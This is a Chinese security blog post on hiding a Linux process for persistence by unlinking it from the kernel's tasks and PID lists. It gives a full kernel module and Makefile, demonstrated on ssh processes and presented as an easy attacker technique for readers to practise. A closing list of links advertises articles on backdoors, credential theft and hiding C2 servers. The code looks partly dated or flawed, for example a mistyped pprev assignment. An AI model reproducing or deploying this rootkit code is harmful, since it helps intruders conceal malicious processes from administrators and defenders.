#  进程隐藏之从tasks与pid链表摘除

原创 麋鹿  [ 麋鹿安全 ](javascript:void\(0\);)

**麋鹿安全** ![]()

微信号 gh_76dddb79ae86

功能介绍 "鹿得美草，口甘其味，则求其友而号其侣也"群居的麋鹿互不猜疑，正如我们的初心--
同甘共苦，共同进步。我们想通过此公众号去传播我们所闻之道，所攻之业，希望能帮助更多的人了解网络安全以及提升自己的技术。我们的追求：低调谦虚 互帮互助
一直进步

____

___发表于_

为了把最好的课程带给大家，这周还是忙于打磨课程，所以更新慢了一点，见谅！

试听课会在这周末上线，敬请期待！

今天继续之前的话题--权限维持之隐藏进程，之前有读者反映看不懂，故这篇选择一个容易理解上手简单的手法--从tasks与pid链表摘除进程。

  
本文目录

![]()

#  

#  **何为PID 链**

  

也就是基于 PID 的链表。

内核中使用一种特殊的数据结构来快速查找基于 PID 的进程信息。这就是 PID 链，它是一种哈希表结构，其中包含了指向 task_struct 的指针。

每个 task_struct 结构体中都包含一个 PID 链表的节点，task_struct包含了进程的详细信息。这些节点链接在一起，形成了一个快速查找特定
PID 对应进程的结构。

通过 PID 链，内核可以迅速找到与特定 PID 相关联的 task_struct 实例，这对于处理诸如信号传递、进程通信等任务至关重要。

  

#  **何为tasks链表**

  

这个链表由 task_struct 结构体组成，用于维护系统中所有进程的信息，每个进程在内核中都有一个对应的 task_struct 实例。

作用：进程追踪，进程管理。

  

 **那么我们把要隐藏的进程从这两个链表摘除，也就是将进程从全局的任务列表中删除，是不是就达到在系统级别隐藏进程的效果了？**

  

#  **开始实验**

  

先看一下ssh的相关进程，隐藏2198进程

![]()

hide_process.c文件内容如下

    
    
    #include <linux/module.h>  
    #include <linux/sched.h>  
    #include <linux/sched/signal.h>  
      
    /* 隐藏特定 PID 的进程 */  
    void hide_process(void)  
    {  
       int pid = 2198; // 您想要隐藏的进程 PID  
       struct task_struct *task = NULL;  
       struct pid *pid_struct = NULL;  
       struct hlist_node *node = NULL;  
      
       /* 获取指定 PID 的 task_struct */  
       pid_struct = find_get_pid(pid);  
       task = pid_task(pid_struct, PIDTYPE_PID);  
       if (!task)  
           return;  
      
       /* 从任务列表中删除该进程 */  
       list_del_rcu(&task->tasks);  
       INIT_LIST_HEAD(&task->tasks);  
      
       /* 从 PID 链表中删除该进程 */  
       node = &task->pids[PIDTYPE_PID].node;  
       hlist_del_rcu(node);  
       INIT_HLIST_NODE(node);  
       node->pprev = &node;  
      
       put_pid(pid_struct);  
    }  
      
    static int __init test_init(void)  
    {  
       hide_process();  
       return 0;  
    }  
      
    static void __exit test_exit(void)  
    {  
       printk(KERN_INFO "Module exit: Process hiding\n");  
    }  
      
    module_init(test_init);  
    module_exit(test_exit);  
    MODULE_LICENSE("GPL");  
    MODULE_AUTHOR("Your Name");

Makefile文件内容如下

    
    
    obj-m += hide_process.o  
      
    all:  
      make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules  
      
    clean:  
      make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

make并加载到内核

![]()

再次查看ssh相关进程，ok隐藏了。

好玩，卸载掉这个模块，再隐藏一个玩玩，改一下对应pid为3273

![]()

ok，成功全部隐藏。简简单单。

  

最后感叹一句，路虽远 行则将至，事虽难
做则必成。希望各位读者不要畏手畏脚，文章中遇到读不懂的东西一定要去研究一下，不要得过且过，偷懒只会让你原地踏步甚至是不进则退，纸上得来终觉浅，绝知此事要躬行，不仅要看懂，更要去实践一下，这样才能有更深刻的理解，才能真正掌握知识，祝大家每天都有进步！

以及：天寒露重，望君保重。

  

 **往期文章汇总**  

 **  
**

权限维持和排查  

[权限维持之加载动态链接库隐藏进程
tcp连接](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247491836&idx=1&sn=40f0b9d91d77b0d68b6c4b27b2f15336&chksm=c0e5dbe3f79252f556edf03572493881336acfc3d59f763d2a0593c9c76877e910ac3e08e345&scene=21#wechat_redirect)  

[继续谈维权手法之监控记录ssh su sudo账号密码
(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247491600&idx=1&sn=bc6f0ee21f33d991a3ee2a14c4fe1d66&chksm=c0e5db0ff7925219eaa2033092e35239d89a383b4ee708d7e8bd05fc950df2af37937b3f8e81&token=477879769&lang=zh_CN&scene=21#wechat_redirect)

[别当初级猴子了，五分钟教你linux维权和排查思路，助你圆梦4k!
(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247491548&idx=1&sn=126c3d3d4e186f5036e6916fea53e7b7&chksm=c0e624c3f791add54bdf2845ce9743cd1ddff9c5972b66bfe6230c78303fe74a674697597a9b&token=477879769&lang=zh_CN&scene=21#wechat_redirect)

[你不知道的win应急思路！从维权到排查，面试必问！不来看看?](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247491486&idx=1&sn=f81f63c41ef881dc3ec3eb9f1f99be48&chksm=c0e62481f791ad972e16ac7d481d12bbd856b617b174183112dcc20d234816b043db96ea97e0&scene=21#wechat_redirect)

[只会netstat?最全应急排查网络连接思路，不学一下吗?](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247491484&idx=1&sn=7ab19f58f33db9f12cbd2ee5e65a71ce&chksm=c0e62483f791ad956e17bbb35c1edad7ae8a5151ae2d9666e4aa33e6f15b4271672aef3a84b3&scene=21#wechat_redirect)  

rootkit原理  

[初探rookit（另一种角度看维权）
(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247483814&idx=1&sn=7b010aaa95aa18e08fbcbd4e2ae81a6c&chksm=c0e63ab9f791b3af6c2a6bac86210301c4e9066af39ebb42d89fbd969730889a9e8e7a5beb04&token=477879769&lang=zh_CN&scene=21#wechat_redirect)

[从linux内核初窥LKM(抛砖引玉之rootkit隐藏进程 or tcp连接原理)
(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247484064&idx=1&sn=13d6a0f76c361beabd8444aad02c0ce7&chksm=c0e639bff791b0a90a7b0cb7cd0db3a88bd405859242afc5153d5f24ec069d00b2fb535eeb99&token=477879769&lang=zh_CN&scene=21#wechat_redirect)

漏洞复现和利用手法

[从0认识+识别+掌握nacos全漏洞(攻防常见洞)带指纹表和利用工具](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247488449&idx=1&sn=34a70cd277f0ee6cf73b306d226de745&chksm=c0e628def791a1c811c76a5c45908eab38fa713230d81c9007668be12993f6ae43021b7a05ca&scene=21#wechat_redirect)

[从0认识+识别+掌握thinkphp全漏洞(超详细看完拿捏tp)文末带工具](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247484212&idx=1&sn=c96aedd22202594fe113c0a471e59f93&chksm=c0e6382bf791b13d20a0f5e4b689f267918913f1810a56502a89ade1544862f973bd86ad87f6&scene=21#wechat_redirect)

[](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247484212&idx=1&sn=c96aedd22202594fe113c0a471e59f93&chksm=c0e6382bf791b13d20a0f5e4b689f267918913f1810a56502a89ade1544862f973bd86ad87f6&scene=21#wechat_redirect)[](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247484059&idx=1&sn=ec11d2d3b029e6c15a19f63b659a3447&chksm=c0e63984f791b092ae957305c3c9eefaf833f60667a8c74d7aa1e1e013655f4efa95dcc8c628&token=477879769&lang=zh_CN&scene=21#wechat_redirect)[从0认识+识别+掌握spring全漏洞(1.8w字超详细看完拿捏spring)文末带工具
(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247484059&idx=1&sn=ec11d2d3b029e6c15a19f63b659a3447&chksm=c0e63984f791b092ae957305c3c9eefaf833f60667a8c74d7aa1e1e013655f4efa95dcc8c628&token=477879769&lang=zh_CN&scene=21#wechat_redirect)

[](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247490445&idx=1&sn=c478ed3ebc151a98bab105967b0522e6&chksm=c0e62092f791a9844f77bcb8b69b480a408c6f3939c688a53cc45d24d509a0169f02adab55d7&scene=21#wechat_redirect)[浅谈宝塔渗透手法，从常见漏洞
聊到 宝塔维权 再到 bypass
disable_functions原理](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247490207&idx=1&sn=fb4213eecd00d529a24ac398f2c1c3bd&chksm=c0e62180f791a89601b1a3e481726c6f81ff75de80555455ef0352e02723209f353bc3321a43&scene=21#wechat_redirect)

[如何快速提升渗透能力?带你打靶场逐个击破hackmyvm之001gift
(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247484252&idx=1&sn=d10feb43f40e49637244e9771c97a479&chksm=c0e63843f791b155094c6e42b65371fa479b932a220b98a78c0053be4ee12632e497fb1f5a14&token=477879769&lang=zh_CN&scene=21#wechat_redirect)

[从Reids漏洞聊到getshell手法，再到计划任务和主从复制原理](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247491080&idx=1&sn=70314d36d97789f674c9e7ba88895e35&chksm=c0e62517f791ac01d660d3674bbf546a1114d138c99f834e936da1d1d99f79a2695ca26cc8ed&scene=21#wechat_redirect)  

[遥遥领先！java内存马分析-[Godzilla-FilterShell]
(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247484180&idx=1&sn=6bc15fc2c9538d1dd742be87f5d76340&chksm=c0e6380bf791b11d449b9fcf7a230a141a0a377e8e5b0a813ca976d22f704cbdd2b3e9ef4bd1&token=477879769&lang=zh_CN&scene=21#wechat_redirect)

[](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247490292&idx=1&sn=ffab19261c43cbae75e9a5872275395b&chksm=c0e621ebf791a8fdfc64de8421d86c602ad83ea4053bf122187ce2552a6a3140069f1d1b8dd5&scene=21#wechat_redirect)[浅分析
Apache Confluence
[CVE-2023-22515]](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247487537&idx=1&sn=6feb1d8d69e6597cdc52e69019714223&chksm=c0e62b2ef791a238529746c78f66676a49a4f0b0e0ce5de5ea8317be85a78ff272c73f77aef9&scene=21#wechat_redirect)

[再谈宝塔后门账号维权](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247490292&idx=1&sn=ffab19261c43cbae75e9a5872275395b&chksm=c0e621ebf791a8fdfc64de8421d86c602ad83ea4053bf122187ce2552a6a3140069f1d1b8dd5&scene=21#wechat_redirect)  

[浅谈jenkins后渗透](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247490445&idx=1&sn=c478ed3ebc151a98bab105967b0522e6&chksm=c0e62092f791a9844f77bcb8b69b480a408c6f3939c688a53cc45d24d509a0169f02adab55d7&scene=21#wechat_redirect)

一些工具和原理  

[](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247489162&idx=1&sn=b81548439bd203781de563c7cf094d91&chksm=c0e62d95f791a483130b9e9421551fa55c0f27fd517f7e43493b95fa7c9bd0feaf0e4fdb9c93&scene=21#wechat_redirect)[浅析HackBrowserData原理以及免杀思路(红队工具之获取目标机器浏览器记录
密码
cookie)](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247485117&idx=1&sn=5c730ef539ea784ba404e858d55fab68&chksm=c0e63da2f791b4b42f952798301c458a88ba9dd6fe1c52fe83a4fcb108b9d249f94b13c649b8&scene=21#wechat_redirect)

[浅析 后渗透之提取微x 聊天记录原理and劫持tg
解密聊天记录原理](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247489162&idx=1&sn=b81548439bd203781de563c7cf094d91&chksm=c0e62d95f791a483130b9e9421551fa55c0f27fd517f7e43493b95fa7c9bd0feaf0e4fdb9c93&scene=21#wechat_redirect)  

[魔改蚁剑之零基础编写解码器](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247490718&idx=1&sn=db9e76760d929f6075118025af380bee&chksm=c0e62781f791ae97bc8a62cc3c79d6a0330d0e37394c449387db8edaa7d9c51e7806761ecfcc&scene=21#wechat_redirect)

一些渗透手法

[浅谈水坑攻击之结合xss平台钓鱼获取浏览器记录和微信数据](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247484235&idx=1&sn=47d36c8585115b2e1d18a0828260bb61&chksm=c0e63854f791b1424897257aee6343114e42719097e7df3a7a67a8b5f6fbc9ab69a622edecd1&scene=21#wechat_redirect)  

[从绕过disable_functions到关于so的一些想法](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247484214&idx=1&sn=0c00e6110d43ba82ac62296f808a119c&chksm=c0e63829f791b13f6561923d93725d070c0a0d27c48454d7fae47029d4e07596895421a0e47c&scene=21#wechat_redirect)  

[windows获取hash常见手法
(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247490744&idx=1&sn=19580442f69aa616f88c1666c811c815&chksm=c0e627a7f791aeb113abdfa2721362e0992b1b5f7bdd39898c167a27df13b3d8ca2073d83380&token=477879769&lang=zh_CN&scene=21#wechat_redirect)

[CDN+Nginx反向代理来隐藏c2地址](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247483929&idx=1&sn=fcc2b4b3d0e941217c4c29366cf6255c&chksm=c0e63906f791b010cf67766d53df3effe574c08266a4ecdc84ae27299a702447f7037ef92b6c&scene=21#wechat_redirect)

[CDN和域名隐藏C2地址
(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247483756&idx=1&sn=bdaf78a367b2075360ff59f93b92c73a&chksm=c0e63a73f791b365029e944a6ca728291a5faa4e8101fe04b69e75ca6e8aa5d103ebbcde7611&token=477879769&lang=zh_CN&scene=21#wechat_redirect)

[云函数实现隐藏c2地址
(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247483680&idx=1&sn=8af803e9f82d6c6dbec7440d33740ffe&chksm=c0e63a3ff791b3292661e1a0f34713d2fd7d20fb6bf36e8928d18295a22b21b7d36305bad871&token=477879769&lang=zh_CN&scene=21#wechat_redirect)[](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247483756&idx=1&sn=bdaf78a367b2075360ff59f93b92c73a&chksm=c0e63a73f791b365029e944a6ca728291a5faa4e8101fe04b69e75ca6e8aa5d103ebbcde7611&token=477879769&lang=zh_CN&scene=21#wechat_redirect)[](http://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247483929&idx=1&sn=fcc2b4b3d0e941217c4c29366cf6255c&chksm=c0e63906f791b010cf67766d53df3effe574c08266a4ecdc84ae27299a702447f7037ef92b6c&scene=21#wechat_redirect)  

一些杂谈  

[考研考公失败，无实习无经验，找不到工作？还有其他赛道吗？(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247490892&idx=1&sn=81e2b2538b9a9af0f53eb6ea79afa3d5&chksm=c0e62653f791af45ca6061daf5a6a1bc17239abbddc7e09f6ab6e3da038dbec15f9bff83d488&token=477879769&lang=zh_CN&scene=21#wechat_redirect)

[晚睡+过度劳累=双杀阳气！五年赛博保安养生法教你如何快速补救！(食补篇)
(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247491055&idx=1&sn=b75dfad2c325b1f3d506878037652b85&chksm=c0e626f0f791afe68b7cc51b61a4faf2479672f8942f23ee5eb6fff4107a5f8471a6e1cce723&token=477879769&lang=zh_CN&scene=21#wechat_redirect)

[](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247489195&idx=1&sn=fffe2412026dfea9b9a67607ec80fb2e&chksm=c0e62db4f791a4a2007387bab0098086b859b77df38f86958074e5dc359e5e284541e6c31e58&token=477879769&lang=zh_CN&scene=21#wechat_redirect)[2023秋招如此惨淡，还有必要继续学安全吗？教你如何破局0offer
(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247485163&idx=1&sn=baf07fcf40c882ea87547d2492686e9c&chksm=c0e63df4f791b4e2767abcf3581772c68f147f444cd5427d4c2ced6c9d331ea2994ed2d72cd0&token=477879769&lang=zh_CN&scene=21#wechat_redirect)

[赛博保安hw讨薪总结(针对学生党)
(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247489195&idx=1&sn=fffe2412026dfea9b9a67607ec80fb2e&chksm=c0e62db4f791a4a2007387bab0098086b859b77df38f86958074e5dc359e5e284541e6c31e58&token=477879769&lang=zh_CN&scene=21#wechat_redirect)

[上专科，干外包驻场，会有未来吗？这辈子就这样了？我的出路在哪？(qq.com)](https://mp.weixin.qq.com/s?__biz=MzkwNjUwNTg0MA==&mid=2247491854&idx=1&sn=0e1ade9decf93f5f9dd0ce1a58fb73e4&chksm=c0e5da11f7925307dd4569177ab2199f29cf4b928b667b3fb782d69a1da2046a87ccf912f368&token=1845745478&lang=zh_CN&scene=21#wechat_redirect)

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# 进程隐藏之从tasks与pid链表摘除

原创 麋鹿  [ 麋鹿安全 ](javascript:void\(0\);)

轻触阅读原文

![]()

麋鹿安全

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

